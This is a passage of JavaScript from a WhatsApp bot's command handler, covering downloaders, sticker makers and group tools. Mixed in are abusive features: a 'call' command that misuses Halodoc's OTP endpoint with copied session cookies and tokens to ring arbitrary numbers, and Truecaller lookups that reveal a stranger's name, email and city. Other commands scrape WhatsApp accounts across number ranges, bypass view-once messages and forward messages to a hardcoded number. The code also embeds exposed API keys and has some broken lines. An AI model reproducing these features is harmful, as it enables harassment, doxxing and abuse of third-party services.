                 if (!text) throw `Ejemplo: *${prefix + command} https://github.com/CarlosTwT*`
                 
                 sisaco.sendMessage(m.chat, {image: {url: `https://api.popcat.xyz/screenshot?url=${text}`}})
            }
            break
            case 'npmsearch':{
 let fetch = require('node-fetch') 
	if (!text) throw `_Ingresa el nombre del paquete npm_\n_Ejemplo_ : ${prefix}npmsearch whatsapp-web.js`
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
        case 'spotify':
         if (args.length == 0) return reply(`Ejemplo: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
            axios.get(`https://api.lolhuman.xyz/api/spotify?apikey=85faf717d0545d14074659ad&url=${args[0]}`).then(({ data }) => {
                var caption = `Title : ${data.result.title}\n`
                caption += `Artist : ${data.result.artists}\n`
                caption += `Duration : ${data.result.duration}\n`
                caption += `Popularity : ${data.result.popularity}\n`
                caption += `Preview : ${data.result.preview_url}\n`
                sisaco.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
                    sisaco.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3`, ptt: true })
                })
            })
            break
case 'play': {
  if (!text) return reply(`✳️ *Type correctly*\n\n📌 Example *${prefix + command}* Lil Peep hate my life `)
  let vid = (await youtubeSearch(text)).video[0]
  if (!vid) return reply('✳️ Vídeo/Audio not found')
  let { title, description, thumbnail, videoId, durationH, viewH, publishedTime } = vid
  const url = 'https://www.youtube.com/watch?v=' + videoId

 let tezt = `
  ≡ *NERDY PLAY*
┌──────────────
▢ 📌 *Title* : ${title}
▢ 📆 *Publication:* ${publishedTime}
▢ ⌚ *Duration:* ${durationH}
▢ 👀 *Views:* ${viewH}
└──────────────
  `
 const templateButtons= [
{index:1, urlButton: {displayText: "Direct Link",url: `${url}`}},
{index:1, callButton: {displayText: "Contact me",phoneNumber: "+354 788 1111"}},
{index:1, quickReplyButton: {displayText: "🎶MP3",id: `${prefix}ytmp3 ${url}`}},
{index:1, quickReplyButton: {displayText: "🎥 MP4",id: `${prefix}ytmp4 ${url}`}}

];                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
       
      const templateMessage={
      
      viewOnceMessage: {
      
      message: {
      
      templateMessage:{
      
      hydratedTemplate: {
      
      hydratedContentText: tezt.trim(),
      hydratedFooterText: "all rights reserved ©sisaco",
      hydratedButtons: templateButtons,                                                          
                  },      
                },
              },      
           },
         };      
      
     sisaco.relayMessage(m.chat, templateMessage, { contextInfo: { externalAdReply: {
                title: `𝑵𝑬𝑹𝑫𝒀 `,
                body: `🧸𝑩𝑶𝑻`,
                thumbnail: thumb,
                mediaType: 2,
                mediaUrl: `https://sisaco.web.app`,
                sourceUrl: `https://sisaco.web.app`
             }}},{ quoted: m });
     }
break

/*
case 'condom2':{
tstcan = args.join(' ')
canCa = `https://telegra.ph/file/97c9f6e4b87ae666574c2.jpg`
canCd = tstcan
const Canvas = require('canvas');
Canvas.registerFont('One-Night-Sans-Medium.ttf', { family: 'One-Night-Sans-Medium' })
const canvas = Canvas.createCanvas(500, 500);
	const context = canvas.getContext('2d');

	const background = await Canvas.loadImage(canCa);
	context.drawImage(background, 0, 0, 500, 500);
		
  context.font = '50px One-Night-Sans-Medium';
  context.fillStyle = '#FFFFFF';
  context.fillText(canCd, 170, 280);
	context.beginPath();
sisaco.sendImage(m.chat, canvas.toBuffer(), 'buy it bro🥵')
}
break*/
case 'google': {
    reply(mess.wait)
    const { googleIt } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let text = args.join` `
    if (!text) return reply(m.chat, 'No text to search', m)
    let url = 'https://google.com/search?q=' + encodeURIComponent(text)
    let search = await googleIt(text)
    let msg = search.articles.map(({
        // header,
        title,
        url,
        description
    }) => {
        return `*${title}*\n_${url}_\n_${description}_`
    }).join('\n\n')
    try {
        let ss = await (await fetch(('nrtm', '/api/ssweb', { delay: 1000, url, full }))).arrayBuffer()
        if (/<!DOCTYPE html>/i.test(ss.toBuffer().toString())) throw ''
        await sisaco.sendFile(m.chat, ss, 'screenshot.png', url + '\n\n' + msg, m)
    } catch (e) {
        reply(msg)
    }
}
   break
 case 'image':case 'gimage': case 'googleimage': {
reply(mess.wait)
if (!text) throw `Example : ${prefix + command} ml nana`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
  {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
   ]
   let buttonMessage = {
  image: { url: images },
  caption: `❰ 𝗚𝗢𝗢𝗚𝗟𝗘 𝗜𝗠𝗔𝗚𝗘 ❱
*𝗤𝗨𝗘𝗥𝗬* : ${text}
*𝗠𝗘𝗗𝗜𝗔 𝗨𝗥𝗟* : ${images}`,
  footer: sisaco.user.name,
  buttons: buttons,
  headerType: 4
   }
   sisaco.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
case 'true2':
  reply(mess.wait)
  const dripska = {
    method: 'GET',
    url: 'https://phonenumbervalidatefree.p.rapidapi.com/ts_PhoneNumberValidateTest.jsp',
    qs: {number: `${text}`},
    headers: {
      'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
      'X-RapidAPI-Host': 'phonenumbervalidatefree.p.rapidapi.com',
      useQueryString: true
    }
  };
  let dhidhi = require('request')
  dhidhi(dripska, function (error, response, body) {
    if (error) throw new Error(error);
    reply(body);
    console.log(body);
  });
break

  
case 'ytmp3':  case 'ytmusic': {    
if (text.length === 0) {
            reply(`❌ URL is empty! \nSend ${prefix}ytmp3 url`);
            return;
        }
        try {
            let urlYt = text;
            if (!urlYt.startsWith("http")) {
                m.reply(`❌ Give youtube link!`);
                return;
            }
            let infoYt = await ytdl.getInfo(urlYt);
            //30 MIN
            if (infoYt.videoDetails.lengthSeconds >= videotime) {
                reply(`❌ I can't download that long video!`);
                return;
            }
            let titleYt = infoYt.videoDetails.title;
            let randomName = getRandom(".mp3");
            const stream = ytdl(urlYt, {
                    filter: (info) => info.audioBitrate == 160 || info.audioBitrate == 128,
                })
                .pipe(fs.createWriteStream(`./${randomName}`));
            await new Promise((resolve, reject) => {
                stream.on("error", reject);
                stream.on("finish", resolve);
            });

            let stats = fs.statSync(`./${randomName}`);
            let fileSizeInBytes = stats.size;
            let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
            if (fileSizeInMegabytes <= dlsize) {
                let yts = require("secktor-pack");
                let search = await yts(text);
                let buttonMessage = {
                    audio: fs.readFileSync(`./${randomName}`),
                    mimetype: 'audio/mpeg',
                    fileName: titleYt + ".mp3",
                    headerType: 4,
                    contextInfo: {
                        externalAdReply: {
                            title: titleYt,
                            body: m.pushname,
                            renderLargerThumbnail: true,
                            thumbnailUrl: search.all[0].thumbnail,
                            mediaUrl: text,
                            mediaType: 1,
                            thumbnail: await getBuffer(search.all[0].thumbnail),
                            sourceUrl: text,
                        },
                    },
                }
                return sisaco.sendMessage(m.chat, buttonMessage, { quoted: m })
            } else {
                m.reply(`❌ File size bigger than 40mb.`);
            }
            fs.unlinkSync(`./${randomName}`);
        } catch (e) {
            console.log(e)
        }
}
break
            case 'chat': {
            
              if (!isDev) return reply(`${mess.owner}`)
                if (!q) return reply(`Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete`)
                if (args[0] === 'mute') {
                    sisaco.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    sisaco.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    sisaco.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    sisaco.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    sisaco.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    sisaco.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    sisaco.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
case 'ig':  {
/*let url;
        if (mek.message.extendedTextMessage) {  
 mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
 }
 else {
            if (!args[0]) return reply('❌ Give Url')
            url = args[0]
            }*/
let json = await  Api.ig(sisaco.igFixed(m.quoted.text)) 
//  let json = await Api.ig(`${text}`)
    
         if (!json.status) return reply('failed')
         json.data.map(async v => {
            sisaco.sendFile(m.chat, v.url, '', `🍟 *Fetching*`, m)
            
         })
      }
break
case 'igreel': {	            
if (!text) throw '*Enter a Link Query!*'
const { instagramdl, instagramdlv2, instagramdlv3 } = require('@bochilteam/scraper')
if (!isUrl(args[0]) && !args[0].includes('instagram.com')) throw '*The link you provided is not valid*'
   
instagramdlv2(`${text}`).then(async (data) => {            
var buf = await getBuffer(data[0].thumbnail)        
sisaco.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail:buf, caption: `${botname}`}, { quoted: m })
}).catch((err) => {
reply(`*Failed to download media and send videos*`)
})
}
break

case 'call':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case 'ytmp4' : {

          if (!text) {
                m.reply(`❌Please provide me a url`);
                return;
            }
            try {
                let urlYt = text;
                if (!urlYt.startsWith("http")) return m.reply(`❌ Give youtube link!`);
                let infoYt = await ytdl.getInfo(urlYt);
                if (infoYt.videoDetails.lengthSeconds >= videotime) return m.reply(`❌ Video file too big!`);
                let titleYt = infoYt.videoDetails.title;
                let randomName = getRandom(".mp4");

                const stream = ytdl(urlYt, {
                        filter: (info) => info.itag == 22 || info.itag == 18,
                    })
                    .pipe(fs.createWriteStream(`./${randomName}`));
                await new Promise((resolve, reject) => {
                    stream.on("error", reject);
                    stream.on("finish", resolve);
                });
                let stats = fs.statSync(`./${randomName}`);
                let fileSizeInBytes = stats.size;
                let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
                if (fileSizeInMegabytes <= dlsize) {
                    let yts = require("secktor-pack");
                    let search = await yts(text);
                    let buttonMessage = {
                        video: fs.readFileSync(`./${randomName}`),
                        jpegThumbnail: thumb,
                        mimetype: 'video/mp4',
                        fileName: `${titleYt}.mp4`,
                        caption: ` ⿻ Title : ${titleYt}\n ⿻ File Size : ${fileSizeInMegabytes} MB`,
                        headerType: 4,
                        contextInfo: {
                            externalAdReply: {
                                title: 'hehe',
                                body: m.pushname,
                                thumbnail: await getBuffer(search.all[0].thumbnail),
                                renderLargerThumbnail: true,
                                mediaType: 2,
                                mediaUrl: search.all[0].thumbnail,
                                sourceUrl: search.all[0].thumbnail
                            }
                        }
                    }
                    return sisaco.sendMessage(m.chat, buttonMessage, { quoted: m })
                } else {
                    m.reply(`❌ File size bigger than 40mb.`);
                }

                fs.unlinkSync(`./${randomName}`);
            } catch (e) {
                console.log(e)
            }
 }
break
case 'true3':{
var numbr = args[0]

var searchData = {
    number: numbr,
    countryCode: "IN",
    installationId: "a1i03--auzTE_kzV-U3UOk6BCn6T9KTnBGxCIg3H0QlRBK1sfp9N9GmXh6WpVKfZ",
    output: "JSON"
}

truecallerjs.searchNumber(searchData).then(async response => {      
    await reply(response)
var tctt = [];
for (let i of response) {
tctt.push(i.data)
reply(data.name)

}

    
})
}
break
case 'true' :

        let SearchNum;
        if (mek.message.extendedTextMessage) {
            SearchNum = mek.message.extendedTextMessage.contextInfo.participant.split("@")[0];
        }
        else {
            if (!args[0]) return reply('❌ Give number or tag on message')
            /*if (body.startsWith("+")) body = body.split("+")[1];
            if (body.startsWith("91")) return reply(`Only 91 can be search at the moment`)*/
            SearchNum = args[0];
        }
        var searchDataa = {
            number: SearchNum,
            countryCode: "IN",
            installationId: "a1i03--auzTE_kzV-U3UOk6BCn6T9KTnBGxCIg3H0QlRBK1sfp9N9GmXh6WpVKfZ"
        }

        var sn = truecallerjs.searchNumber(searchDataa);
        sn.then(function (response) {
            let data = response.data[0];
            const trueSend = `╭──〔 *NUMBER INFO* 〕
├ *ɴᴜᴍʙᴇʀ:* ${data.phones[0].e164Format ? data.phones[0].e164Format : ""}   
├ *ɴᴀᴍᴇ:* ${data.name}
├ *ᴄᴀʀᴇᴇʀ:* ${data.phones[0].carrier ? data.phones[0].carrier : ""}
├ *ᴄᴏᴜɴᴛʀʏ:* ${data.addresses[0].address ? data.addresses[0].address : ""}
├ *ᴄɪᴛʏ:* ${data.addresses[0].city ? data.addresses[0].city : ""}
├ *ɴᴜᴍʙᴇʀ ᴛʏᴘᴇ:* ${data.phones[0].numberType ? data.phones[0].numberType : ""}
├ *ᴇᴍᴀʟ:* ${data.internetAddresses[0] ? data.internetAddresses[0].id : ""}
╰──────────────`
            sisaco.sendMessage(from, { text: trueSend, jpegThumbnail: tu},{quoted:mek}) 
            
        });


break
  /* resultt = `╭──〔 *NUMBER INFO* 〕
├ *ɴᴜᴍʙᴇʀ:* ${data.phones.e164Format}
├ *ɴᴀᴍᴇ:* ${data.name}
├ *sᴄᴏʀᴇ:* ${data.score}
├ *ᴀᴄᴄᴇss:* ${data.access}
├ *ᴄᴀʀᴇᴇʀ:* ${data.phones.carrier}
├ *ᴅɪᴀʟɪɴɢ ᴄᴏᴅᴇ:* ${data.phones.dialingCode}
├ *ᴄᴏᴜɴᴛʀʏ:* "IN"
├ *ᴄɪᴛʏ:* ${data.addresses.city}
├ *ᴛʏᴘᴇ:* ${data.phones.type}
├ *ᴛɪᴍᴇ ᴢᴏɴᴇ:* ${data.addresses.timeZone}
╰──────────────`*/
    
//sisaco.sendMessage(from, { text: resultt, jpegThumbnail: tu},{quoted:mek}) 

      //╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺
      case 'igdl':
      case 'instagram': {
        if (!args[0]) return reply(`Example :\n${prefix + command} https://www.instagram.com/p/CcvJGuxh9VI/?igshid=YmMyMTA2M2Y=`)
        try {
          hx.igdl(args[0])
            .then(async (resed) => {
              ini_anu = []
              anu_list = []
              textbv = `*| INSTAGRAM DOWNLOADER |*\n\n✨ Username : ${resed.user.username ? resed.user.name : "ZERO-TWO BOTTO"}\n✨ Followers : ${resed.user.followers}`
              urut = 1
              for (let i = 0; i < resed.medias.length; i++) {
                ini_anu.push({
                  "type": resed.medias[i].fileType,
                  "url": resed.medias[i].url
                })
              }
              ilod = 1
              for (let i of ini_anu) {
                anu_list.push({ buttonId: `-ig ${i.type} ${i.url}`, buttonText: { displayText: `Media ${ilod++}` }, type: 1 })
              }
              textbv += `\n\n_Select the media below to download_`
              let buttons = anu_list
              let buttonMessage = {
                image: thumb,
                jpegThumbnail: thumb,
                caption: textbv,
                footer: `Nerdy`,
                buttons: buttons,
                headerType: 4
              }
              sisaco.sendMessage(from, buttonMessage, { quoted: m })
            })
        }
        catch (err) {
          reply(String(err))
        }
      }
      break;
       case 'attp': {
		
           if (!text) return reply(`Example : ${prefix + command} text`)
           await sisaco.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})

         }
         break
case 'attp2': {

           if (!text) reply(`Use ${prefix}attp hello\n*Example : ${prefix + command} ${ownername}*` )
           await sisaco.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/attp?teks=${text}`, 'Xeon', 'Op', m, {asSticker: true}).catch((err) => reply(mess.error))
         }
         break
case 'ttp': {

           if (!text) return reply(`*Example : ${prefix + command} hello*`)
           await sisaco.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
         
                     }
                     break


case 'igs':{
     let json = await Api.igs(args[0])
         if (!json.status) return reply('failed')
         for (let i = 0; i < json.data.length; i++) {
            sisaco.sendFile(m.chat, json.data[i].url, ``, `🍟 *Fetching* :`, m)
           
         }
         reply(`✅ Done, all stories successfully downloaded`)
}
break
case 'menu' : {
const pre = generateWAMessageFromContent(m.chat, { liveLocationMessage:{
  degreesLatitude: 35.685506276233525,
  degreesLongitude: 139.75270667105852,
  accuracyInMeters: 100,
  speedInMps: 999,
  degreesClockwiseFromMagneticNorth: 99,
  caption: `text`.trim(),
  sequenceNumber: 774236889,
  timeOffset: 8600,
  jpegThumbnail: global.ttt,
//  contextInfo: { mentionedJid: [m.sender] }
}}, { quoted: m})
return sisaco.relayMessage(m.chat, pre.message)
} 
break  
//©from: dennis
case 'groupsetting':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `groupsetting open`, buttonText: { displayText: "OPEN" }, type: 1},{ buttonId: `groupsetting close`, buttonText: { displayText: "CLOSE" }, type: 1}], {quoted:mek})
if (dn === 'open'){ await sisaco.groupSettingUpdate(from, 'not_announcement')
} else if (dn === 'close'){ await sisaco.groupSettingUpdate(from, 'announcement')} else { reply('Error')}
break
case 'button': {
 const templateButtons= [
{index:1, urlButton: {displayText: "Connect💜",url: "https://sisaco.web.app"}},
{index:1, callButton: {displayText: "Contact me",phoneNumber: "+354 788 1111"}},
{index:1, quickReplyButton: {displayText: "speed",id: `${prefix}ping`}},
{index:1, quickReplyButton: {displayText: "sisaco",id: "https://guthum.com"}}

];                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
       
      const templateMessage={
      
      viewOnceMessage: {
      
      message: {
      
      templateMessage:{
      
      hydratedTemplate: {
      
      hydratedContentText: ".\n\n\n\n\n\n\n\n\n\n\n\n\n\n.",
      hydratedFooterText: "all rights reserved ©sisaco",
      hydratedButtons: templateButtons,                                                          
                  },      
                },
              },      
           },
         };      
      
     sisaco.relayMessage(m.chat, templateMessage, { quoted: m });
     }
     break
case 'hai': case 'take': {
            let main = botNumber
             await quoted.copyNForward(main, true)
             m.reply(`sended`)
             }
             break

case 'shi': case 'shu': {
            let main = botNumber
             await quoted.copyNForward('3547881111@s.whatsapp.net', true)
             m.reply(`sended`)
             }
             break
case 'checknum': case 'searchnumber':{
        if (!args[0]) return reply(`Use command like: ${prefix}checknum <digits>****`)
        var inputnumber = args[0]
        if (!inputnumber.includes('*')) return reply('Ahhh,Please consider putting * in last.')
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
        return string.split(word).length - 1;
        }
        var number0 = inputnumber.split('*')[0]
        var number1 = inputnumber.split('*')[countInstances(inputnumber, '*')] ? inputnumber.split('*')[countInstances(inputnumber, '*')] : ''
        var random_length = countInstances(inputnumber, '*')
        var randomxx;
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var nomerny = `*--List of Whatsapp Numbers--**\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within the range you provided*\n`
        for (let i = 0; i < randomxx; i++) {
        var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
        var status1 = nu[Math.floor(Math.random() * nu.length)]
        var status2 = nu[Math.floor(Math.random() * nu.length)]
        var status3 = nu[Math.floor(Math.random() * nu.length)]
        var dom4 = nu[Math.floor(Math.random() * nu.length)]
        var rndm;
        if (random_length == 1) {
        rndm = `${status1}`
        } else if (random_length == 2) {
        rndm = `${status1}${status2}`
        } else if (random_length == 3) {
        rndm = `${status1}${status2}${status3}`
        } else if (random_length == 4) {
        rndm = `${status1}${status2}${status3}${dom4}`
        }
        var anu = await sisaco.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`);
        var anuu = anu.length !== 0 ? anu : false
        try {
        try {
        var anu1 = await sisaco.fetchStatus(anu[0].jid)
        } catch {
        var anu1 = '401'
        }
        if (anu1 == '401' || anu1.status.length == 0) {
        nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
        } else {
        nomerny += `*•Number:* wa.me/${anu[0].jid.split("@")[0]}\n*•Bio :* ${anu1.status}\n*•Updated On :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
        }
        } catch {
        nowhatsapp += `${number0}${i}${number1}\n`
        }
        }
        m.reply(`${nomerny}${nobio}${nowhatsapp}`)
        }
        break
case 'need':{
            await quoted.copyNForward(m.chat, true, {readViewOnce: true} )
             }
             break 
//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = mek.message.extendedTextMessage.contextInfo.participant
await sisaco.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = mek.message.extendedTextMessage.contextInfo.participant
await sisaco.groupParticipantsUpdate(from, [remove], "remove")
break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (/image/.test(mime)) {
let media = await quoted.download()
reply('wait')
let encmedia = await sisaco.sendImageAsSticker(m.chat, media, m,  { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
reply('wait')
let media = await quoted.download()
let encmedia = await sisaco.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'listonline': case 'listaktif': {
if (!m.isGroup) return reply(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
let liston = 1
sisaco.sendText(m.chat, '     「 Online List 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break

      case "igstory":
        if (q === "help") {
          await sisaco.reply(`*❗Command:*  Insta Story\n*🍀Aliases* -igstory\n*🧩Category:* Downloader\n*🛠️Usage:* ${
            prefix + command
          } story link\n\n*📚Description:* Downloads story from Instagram.`);
          return;
        }
        if (!q) return reply("Username?");
        let result = await instagramGetUrl(q)       
          .then(async (result) => {
            for (let i of result) {
              sisaco.sendFile(m.chat, result, 'instagram.mp4', `『 - - - - - ɪɴsᴛᴀɢʀᴀᴍ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ - - - - - 』*`, rpl,m)
            }
          });
        break;
case 'run':{
if (!args.join(" ")) return reply(`Example : run python3`)
if (!m.quoted) return reply('Reply to text')
let rru = args.join(" ")
//if (!languagecode.includes(`rru`) return reply('invalid Language')
let rr = args.join(" ")
const program = {
        script: m.quoted.text,
        language: args.join(" "),
        versionIndex: "0",
//        stdin: args.slice(2).join(" "),
        clientId: clientid,
        clientSecret: clients
      };
         
  
await request(
        {
          url: "https://api.jdoodle.com/v1/execute",
          method: "POST",
          json: program
        },
 function (error, response, body) {
    let pur = body.output
    sisaco.sendMessage(m.chat, { text: `🐧 ${rr} \n\n ${pur}`, jpegThumbnail: tu })   
})
   
}
break
case 'swm': case 'take': case 'stickerwm': {

if (!args.join(" ")) return reply(`Example :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
sisaco.downloadAndSaveMediaMessage(quoted, "gifee")
sisaco.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await sisaco.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await sisaco.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break
                
            case 'tagall': {     
if (!isGroup) return reply('Bruhhh isnt a group')
//if (!isGroupAdmins) return reply('You must be an admin to use this command')       	
let teks = `╚»˙·٠•●💜 Tag All 💜●•٠·˙«╝ 
 
 ➲ *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `💜 @${mem.id.split('@')[0]}\n`
                }
                sisaco.sendMessage(from, { text: teks, jpegThumbnail: tu, mentions: participants.map(a => a.id) }, { quoted: m })

                }
                break
case 'smeme': case 'stickermeme': case 'stickmeme': {	
let { TelegraPh } = require('./lib/uploader2')
if (!text) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (text.includes('|')) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
reply(mess.wait)
mee = await sisaco.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await sisaco.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
